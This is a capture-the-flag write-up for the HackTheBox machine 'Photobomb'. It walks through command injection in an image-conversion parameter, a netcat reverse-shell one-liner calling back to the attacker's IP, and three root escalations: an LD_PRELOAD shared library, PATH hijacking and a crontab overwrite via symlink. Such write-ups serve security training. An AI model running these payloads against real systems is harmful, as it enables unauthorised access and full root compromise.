# HackTheBox - Photobomb

## NMAP

```bash
Nmap scan report for 10.10.11.182
Host is up (0.093s latency).
Not shown: 54171 closed tcp ports (conn-refused), 11362 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 e2:24:73:bb:fb:df:5c:b5:20:b6:68:76:74:8a:b5:8d (RSA)
|   256 04:e3:ac:6e:18:4e:1b:7e:ff:ac:4f:e3:9d:d2:1b:ae (ECDSA)
|_  256 20:e0:5d:8c:ba:71:f0:8c:3a:18:19:f2:40:11:d2:9e (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://photobomb.htb/
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

## PORT 80 (HTTP)
Visting the web server, it's going to redirect us to `photobomb.htb` so we need to add it in hosts file

<img src="https://i.imgur.com/mu9gGFI.png"/>

<img src="https://i.imgur.com/PtM6ejk.png"/>

<img src="https://i.imgur.com/lS4D4IV.jpg"/>

It shows a link which takes us to `/printer` that asks for credentials

<img src="https://i.imgur.com/QwZt6cC.png"/>

We can find the credentials by checking the source of the site which shows a js file having the credentials

<img src="https://i.imgur.com/P3TmMxa.png"/>

With this, we can access the printer page

<img src="https://i.imgur.com/Z9LV7Vo.jpg"/>

What this page does it converts the image into either png or jpg into the specified dimensions displayed on the site

<img src="https://i.imgur.com/GmOfo4E.png"/>

If we remove any of the POST paramter when downloading the file, it's going to show a stack error revealing that it's using `ruby sinatra` server

<img src="https://i.imgur.com/q2ukvuK.png"/>

<img src="https://i.imgur.com/myikUAY.png"/>

## Foothold

We can see from the stackerror that the `filetype` parameter is being checked if it contains either `png` or `jpeg`, so we can try command injection there, I tried appending the `id` command with `;` but it didn't returned any output

<img src="https://i.imgur.com/1qn386h.png"/>

So I tried making a curl request to my python server which was successful

<img src="https://i.imgur.com/a2USJVt.png"/>

<img src="https://i.imgur.com/4RWYzhI.png"/>

Using openbsd nc's reverse shell payload by making it url encoded

```bash
rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.72 2222 >/tmp/f
```

<img src="https://i.imgur.com/ObmY4zn.png"/>

<img src="https://i.imgur.com/WA5Jtbi.png"/>

Stabilizing the shell with python3 

<img src="https://i.imgur.com/DKpN6Ns.png"/>

## Privilege Escalation (root)
Running `sudo -l` shows that we can run `cleanup.sh` as a root user

<img src="https://i.imgur.com/qHywqqs.png"/>

## Method 1

This is allowing us to set environment variables, which means we can set `LD_PRELOAD` path which contains the path to the shared library that will be loaded before anything else, so we can abuse this by compiling this program into a shared library which will set bash a SUID and will spawn it with `bash -p` giving us a root shell

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
        unsetenv("LD_PRELOAD");
        setresuid(0,0,0);
        system("/bin/bash -p");
}
```

```bash
gcc -fPIC -shared -nostartfiles -o ./load.so ./test.c
```

<img src="https://i.imgur.com/KmhZQzW.png"/>

```bash
sudo LD_PRELOAD=/tmp/load.so /opt/cleanup.sh
```

<img src="https://i.imgur.com/k0bWV39.png"/>

## Method 2

Checking the script which we can run

```bash
#!/bin/bash
. /opt/.bashrc
cd /home/wizard/photobomb

# clean up log files
if [ -s log/photobomb.log ] && ! [ -L log/photobomb.log ]
then
  /bin/cat log/photobomb.log > log/photobomb.log.old
  /usr/bin/truncate -s0 log/photobomb.log
fi

# protect the priceless originals
find source_images -type f -name '*.jpg' -exec chown root:root {} \;

```

This script is switching to `/home/wizard/photobomb`, where with `-s` it checks if `photobomb.log` exists and is empty, with `-L` and `!` it checks if the logfile isn't a symlink to avoid symlinking and then overwrites the content of photobomb.log to photobomb.log and clears out the the contents of the log file, then with `find` it look for all jpg files and makes root the owner of those images

Now here `find` isn't being ran through it's absolute path which means that we can abuse it by making a file which will spawn bash for us by setting environment variables through which we can achieve PATH variable exploit

<img src="https://i.imgur.com/o29rWJf.png"/>

```bash
sudo PATH=/tmp:$PATH /opt/cleanup.sh
```

<img src="https://i.imgur.com/05ox0ch.png"/>

## Method 3

Going back to the script, the if condition checks for `photobomb.log` but not `photobomb.log.old` so we can symlink the old log file with `/etc/crontab` and include the crontab in the original log file which will basically overwrite the crontab file

So symlinking the file with cronab 

```bash
ln -sf /etc/crontab photobomb.log.old
```

<img src="https://i.imgur.com/hHaSdIe.png"/>

Now place a bash script which will make bash a SUID or you can place a reverse shell there

```bash
#!/bin/bash
chmod +s /bin/bash
```

<img src="https://i.imgur.com/1zvfK9N.png"/>

```bash
* * * * * root /tmp/shell.sh
```

Putting the cronab in `photobomb.log` file which will overwrite the old log file which will then overwrite the cronab file, making bash a SUID and then we can spawn bash with `-p` to execute it as the SUID owner which is root

<img src="https://i.imgur.com/ZKOB3aq.png"/>

## References

- https://atom.hackstreetboys.ph/linux-privilege-escalation-environment-variables/
- https://medium.com/r3d-buck3t/overwriting-preload-libraries-to-gain-root-linux-privesc-77c87b5f3bf8
- https://book.hacktricks.xyz/linux-hardening/privilege-escalation
